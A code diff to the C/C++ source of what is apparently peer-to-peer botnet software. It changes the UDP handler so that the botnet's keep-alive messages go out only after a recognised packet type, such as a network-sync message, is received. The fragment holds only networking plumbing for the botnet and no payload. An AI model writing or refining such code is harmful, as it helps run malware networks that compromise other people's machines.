@@ -126,7 +126,7 @@ void peer_request()
 /* end P2P */
 
 /* handling incomings */
-static void handle_udp_connections()
+static int handle_udp_connections()
 {
 	/* locals */
 	u_char data[1024];
@@ -139,7 +139,7 @@ static void handle_udp_connections()
 	
 	for (size_t i = 0; i < adapters_count; i++)
 		if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
-			return;
+			return 0;
 	
 	switch (p->type)
 	{
@@ -160,7 +160,10 @@ static void handle_udp_connections()
 	case PACK_TYPE::NETWORK_SYNC:
 		botnet_topology.handleSync(data, client);
 		break;
+	default:
+		return 0;
 	}
+	return 1;
 }
 
 static void handle_tcp_connections(SOCKET client)
@@ -180,10 +183,13 @@ void handle_incomings()
 	FD_ZERO(&master);
 	FD_SET(udp_sock, &master);
 	FD_SET(tcp_sock, &master);
+
 	struct timeval tv = { 30, 0 };   // sleep for 30 seconds.
+	int flag;
 
 	while (1)
 	{
+		flag = 0;
 		copy = master;
 		size_t socketCount = select(0, &copy, NULL, NULL, &tv);
 
@@ -191,7 +197,7 @@ void handle_incomings()
 		{
 			SOCKET s = copy.fd_array[i];
 			if (s == udp_sock)
-				handle_udp_connections();
+				flag = handle_udp_connections();
 			else if (s == tcp_sock)
 			{
 				SOCKET client = accept(tcp_sock, NULL, NULL);
@@ -203,7 +209,8 @@ void handle_incomings()
 				FD_CLR(s, &master);
 			}
 		}
-		botnet_topology.keepAlive(udp_sock);
+		if (flag)
+			botnet_topology.keepAlive(udp_sock);
 	}
 }
 /* end handling incomings */
